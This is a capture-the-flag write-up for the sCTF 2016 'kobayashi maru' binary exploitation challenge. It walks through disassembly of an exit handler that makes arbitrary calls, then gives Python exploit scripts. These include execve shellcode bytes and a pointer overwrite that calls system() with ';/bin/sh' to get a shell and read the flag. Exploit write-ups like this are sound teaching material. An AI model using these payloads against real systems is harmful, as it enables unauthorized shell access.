## kobayashi maru - 200 (Pwning) ##
#### Writeup by r3ndom_ #####
Created: 2016-4-17

### Problem ###
The bomb (see: bomb_squad) was pretty simple. But they hid a secret in there, and it's not solvable! Can you break in and win in the face of an unwinnable challenge?
`nc problems2.2016q1.sctf.io 1340`

### Hint ###
None

## Answer ##

### Overview ###
Find a vulnerability and exploit it!

In particular exploit arbitrary calls for this.

### Details ###

The problem name is a reference to [Star Trek](https://en.wikipedia.org/wiki/Kobayashi_Maru). 

The big vulnerability in this problem has to deal with the `secret_phase` in bomb_squad and the `__gg` function found in the binary, which is called on program exit:

```asm
.text:08048751                                      public __gg
.text:08048751                      __gg            proc near               ; DATA XREF: .fini_array:0804AF0Co
.text:08048751
.text:08048751                      var_28          = dword ptr -28h
.text:08048751                      var_24          = dword ptr -24h
.text:08048751                      var_20          = dword ptr -20h
.text:08048751                      var_1C          = dword ptr -1Ch
.text:08048751                      var_18          = dword ptr -18h
.text:08048751                      var_14          = dword ptr -14h
.text:08048751                      var_10          = dword ptr -10h
.text:08048751                      var_C           = dword ptr -0Ch
.text:08048751                      var_4           = dword ptr -4
.text:08048751
.text:08048751 55                                   push    ebp
.text:08048752 89 E5                                mov     ebp, esp
.text:08048754 53                                   push    ebx
.text:08048755 83 EC 24                             sub     esp, 24h
.text:08048758 C7 45 E0 70 B0 04 08                 mov     [ebp+var_20], offset n1
.text:0804875F C7 45 E4 8C B0 04 08                 mov     [ebp+var_1C], offset n2
.text:08048766 C7 45 E8 A8 B0 04 08                 mov     [ebp+var_18], offset n3
.text:0804876D C7 45 EC C4 B0 04 08                 mov     [ebp+var_14], offset n4
.text:08048774 C7 45 F0 E0 B0 04 08                 mov     [ebp+var_10], offset n5
.text:0804877B C7 45 F4 FC B0 04 08                 mov     [ebp+var_C], offset n6
.text:08048782 C7 45 D8 00 00 00 00                 mov     [ebp+var_28], 0
.text:08048789 EB 72                                jmp     short loc_80487FD
.text:0804878B                      ; ---------------------------------------------------------------------------
.text:0804878B
.text:0804878B                      loc_804878B:                            ; CODE XREF: __gg+B0j
.text:0804878B B8 10 00 00 00                       mov     eax, 10h
.text:08048790 83 E8 01                             sub     eax, 1
.text:08048793 83 C0 13                             add     eax, 13h
.text:08048796 BB 10 00 00 00                       mov     ebx, 10h
.text:0804879B BA 00 00 00 00                       mov     edx, 0
.text:080487A0 F7 F3                                div     ebx
.text:080487A2 6B C0 10                             imul    eax, 10h
.text:080487A5 29 C4                                sub     esp, eax        ; eax always is 32 here.
.text:080487A7 89 E0                                mov     eax, esp
.text:080487A9 83 C0 0F                             add     eax, 0Fh
.text:080487AC C1 E8 04                             shr     eax, 4
.text:080487AF C1 E0 04                             shl     eax, 4
.text:080487B2 89 45 DC                             mov     [ebp+var_24], eax
.text:080487B5 8B 45 D8                             mov     eax, [ebp+var_28]
.text:080487B8 8B 54 85 E0                          mov     edx, [ebp+eax*4+var_20]
.text:080487BC 8B 45 DC                             mov     eax, [ebp+var_24]
.text:080487BF 8B 0A                                mov     ecx, [edx]
.text:080487C1 89 08                                mov     [eax], ecx
.text:080487C3 8B 4A 04                             mov     ecx, [edx+4]
.text:080487C6 89 48 04                             mov     [eax+4], ecx
.text:080487C9 8B 4A 08                             mov     ecx, [edx+8]
.text:080487CC 89 48 08                             mov     [eax+8], ecx
.text:080487CF 8B 4A 0C                             mov     ecx, [edx+0Ch]
.text:080487D2 89 48 0C                             mov     [eax+0Ch], ecx
.text:080487D5 8B 4A 10                             mov     ecx, [edx+10h]
.text:080487D8 89 48 10                             mov     [eax+10h], ecx
.text:080487DB 8B 4A 14                             mov     ecx, [edx+14h]
.text:080487DE 89 48 14                             mov     [eax+14h], ecx
.text:080487E1 8B 52 18                             mov     edx, [edx+18h]
.text:080487E4 89 50 18                             mov     [eax+18h], edx
.text:080487E7 8B 45 DC                             mov     eax, [ebp+var_24]
.text:080487EA 8B 40 14                             mov     eax, [eax+14h]
.text:080487ED 85 C0                                test    eax, eax
.text:080487EF 74 08                                jz      short loc_80487F9
.text:080487F1 8B 45 DC                             mov     eax, [ebp+var_24]
.text:080487F4 8B 40 14                             mov     eax, [eax+14h]
.text:080487F7 FF D0                                call    eax
.text:080487F9
.text:080487F9                      loc_80487F9:                            ; CODE XREF: __gg+9Ej
.text:080487F9 83 45 D8 01                          add     [ebp+var_28], 1
.text:080487FD
.text:080487FD                      loc_80487FD:                            ; CODE XREF: __gg+38j
.text:080487FD 83 7D D8 05                          cmp     [ebp+var_28], 5
.text:08048801 7E 88                                jle     short loc_804878B
.text:08048803 8B 5D FC                             mov     ebx, [ebp+var_4]
.text:08048806 C9                                   leave
.text:08048807 C3                                   retn
.text:08048807                      __gg            endp
```

Basically this function will end up calling the last 4 bytes of the name of each node, given that those 4 bytes are not 0.

So we have an arbitrary call to whatever, now we look for something to write code.

How convenient! A function which `mprotect`s a buffer in the `.bss` section, `__pp` which is called on startup:

```asm
.text:08048CDA                                      public __nr
.text:08048CDA                      __nr            proc near
.text:08048CDA
.text:08048CDA                      dest            = byte ptr -10Ch
.text:08048CDA                      var_10          = dword ptr -10h
.text:08048CDA                      var_C           = dword ptr -0Ch
.text:08048CDA
.text:08048CDA 55                                   push    ebp
.text:08048CDB 89 E5                                mov     ebp, esp
.text:08048CDD 81 EC 28 01 00 00                    sub     esp, 128h
.text:08048CE3 65 A1 14 00 00 00                    mov     eax, large gs:14h
.text:08048CE9 89 45 F4                             mov     [ebp+var_C], eax
.text:08048CEC 31 C0                                xor     eax, eax
.text:08048CEE E8 55 FC FF FF                       call    get_line
.text:08048CF3 89 44 24 04                          mov     [esp+4], eax    ; src
.text:08048CF7 8D 85 F4 FE FF FF                    lea     eax, [ebp+dest]
.text:08048CFD 89 04 24                             mov     [esp], eax      ; dest
.text:08048D00 E8 7B F8 FF FF                       call    _strcpy
.text:08048D05 E8 3E FC FF FF                       call    get_line
.text:08048D0A 8B 55 F0                             mov     edx, [ebp+var_10]
.text:08048D0D 89 44 24 04                          mov     [esp+4], eax    ; src
.text:08048D11 89 14 24                             mov     [esp], edx      ; dest
.text:08048D14 E8 67 F8 FF FF                       call    _strcpy
.text:08048D19 8B 45 F4                             mov     eax, [ebp+var_C]
.text:08048D1C 65 33 05 14 00 00 00                 xor     eax, large gs:14h
.text:08048D23 74 05                                jz      short locret_8048D2A
.text:08048D25 E8 46 F8 FF FF                       call    ___stack_chk_fail
.text:08048D2A                      ; ---------------------------------------------------------------------------
.text:08048D2A
.text:08048D2A                      locret_8048D2A:                         ; CODE XREF: __nr+49j
.text:08048D2A C9                                   leave
.text:08048D2B C3                                   retn
.text:08048D2B                      __nr            endp
``` 

And since we know `mprotect` protects all the _pages_ that the range provided overlaps we should just be able to write code into the get_line buffer and execute that, right? Since pages by default on linux are 0x1000 bytes, or 4096 bytes in decimal, the buffer provided to the `mprotect` is only 0x400 or 1024 bytes.

Here's some code that _should_ work:

```python
# Gets it to cat flag or whatever
print '8584'
print '[1,1,3,5,11,21]'
print ''
print '3 0 3 0 3 0 0\0' + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

import struct
def ga(x):
	return struct.pack('<L', x)

print 'AAAA' + ga(0x804B590)
```

So we try it and no dice, it doesn't execute! Then we bp right after the `mprotect` to see that it fails, always with return code `-1`. 

(The intended solution was to use this RWE buffer for the code to write with the `__nr` function that I don't cover. However the `mprotect` is broken which makes this non-viable, even though `get_line`'s' buffer would also be executable and I could do the cheesey write shellcode there trick for ez exploitation)

Fear not for we can still do the problem, at the time of the call the pointer to the next node is on the top of the stack, meaning we can call system with the name of the node being the parameter.

```python
# Gets it to cat flag or whatever
print '8584'
print '[1,1,3,5,11,21]'
print ''
print '3 0 3 0 3 0 0'

import struct
def ga(x):
	return struct.pack('<L', x)

print 'AAAA' + ga(0x80485a0) + ';/bin/sh'
```

So the call to system in C code would look like `system("\xa8\xb0\x04\x08\xc4\xb0\x04\x08\xe0\xb0\x04\x08\xfc\xb0\x04\x08;/bin/sh");`

This is because it calls the system address with the ptr to node2 on the stack, which acts as the first parameter, because none of the addresses in node2 have a 0 byte in them we can send a bash command easily.

Running the above script, piping it into the nc, then `cat secret.txt` gets you the flag.

### Flag ###

The flag was `sctf{1f_y0u_c4nt_w1n_ch34t}`
